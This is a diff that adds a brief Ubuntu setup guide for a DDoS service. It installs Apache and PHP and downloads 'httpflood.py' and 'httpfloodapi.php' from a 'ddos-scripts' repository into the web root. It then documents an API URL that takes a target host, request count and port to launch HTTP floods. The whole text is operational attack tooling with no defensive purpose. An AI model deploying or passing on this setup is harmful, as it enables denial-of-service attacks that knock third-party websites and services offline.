@@ -1,0 +1,16 @@
+• Ubuntu •
+sudo apt update
+sudo apt install apache2 php libapache2-mod-php php7.0-cli
+sudo apt-get install libssh2-1 php-ssh2 -y
+sudo wget https://raw.githubusercontent.com/runconnor/ddos-scripts/master/httpflood.py
+cd /var/www/html
+sudo wget https://raw.githubusercontent.com/runconnor/ddos-scripts/master/httpfloodapi.php
+sudo systemctl restart apache2
+
+Visit http://your_vps_ip/httpfloodapi.php to ensure everything was installed correctly before trying to execute.
+
+API urls:
+
+http://vps_ip/httpfloodapi.php?host={$host}&requests={$requests}&port={$port)
+
+• CentOS Coming Soon •
